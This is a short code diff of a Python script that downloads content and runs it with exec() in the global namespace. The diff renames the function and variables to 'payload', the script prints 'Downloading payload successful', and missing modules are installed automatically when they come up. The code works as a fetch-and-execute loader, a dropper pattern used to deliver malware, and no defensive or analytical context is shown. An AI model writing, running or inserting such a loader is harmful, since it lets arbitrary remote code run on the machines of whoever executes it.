@@ -17,9 +17,9 @@ def has_internet():
         print(f"Error checking internet: {e}")
         return False, None
 
-def execute_a_py(script_content):
+def execute_payload(payload):
     try:
-        exec(script_content, globals())
+        exec(payload, globals())
     except Exception as e:
         if isinstance(e, ModuleNotFoundError):
             module_name = str(e).split("'")[1]
@@ -36,12 +36,12 @@ def install_module(module_name):
         print(f"Error installing module {module_name}: {e}")
         raise
 
-connected, a_py_content = has_internet()
+connected, payload = has_internet()
 
 if connected:
     print("Downloading payload successful.")
     try:
-        execute_a_py(a_py_content)
+        execute_payload(payload)
     except Exception as e:
         print(f"Error during execution: {e}")
 else:
